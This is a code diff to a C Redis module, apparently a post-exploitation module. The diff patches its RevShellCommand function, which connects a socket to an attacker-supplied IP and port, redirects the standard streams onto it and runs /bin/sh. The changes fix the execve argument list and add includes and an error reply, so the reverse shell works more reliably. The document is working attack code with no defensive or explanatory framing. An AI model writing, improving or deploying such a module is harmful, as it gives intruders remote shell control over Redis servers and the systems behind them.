@@ -8,6 +8,8 @@
 #include <sys/types.h> 
 #include <sys/socket.h>
 #include <netinet/in.h>
+#include <arpa/inet.h>
+#include <string.h>
 
 int DoCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
         if (argc == 2) {
@@ -38,8 +40,8 @@ int DoCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
 int RevShellCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
 	if (argc == 3) {
 		size_t cmd_len;
-		char *ip = RedisModule_StringPtrLen(argv[1], &cmd_len);
-		char *port_s = RedisModule_StringPtrLen(argv[2], &cmd_len);
+		const char *ip = RedisModule_StringPtrLen(argv[1], &cmd_len);
+		const char *port_s = RedisModule_StringPtrLen(argv[2], &cmd_len);
 		int port = atoi(port_s);
 		int s;
 
@@ -54,7 +56,10 @@ int RevShellCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
 		dup2(s, 1);
 		dup2(s, 2);
 
-		execve("/bin/sh", 0, 0);
+		//execve("/bin/sh", 0, 0);
+		execve("/bin/sh", (char *const[]){"/bin/sh", NULL}, NULL);
+        	// If execve fails, return an error response
+        	RedisModule_ReplyWithError(ctx, "Execution of /bin/sh failed");
 	}
     return REDISMODULE_OK;
 }
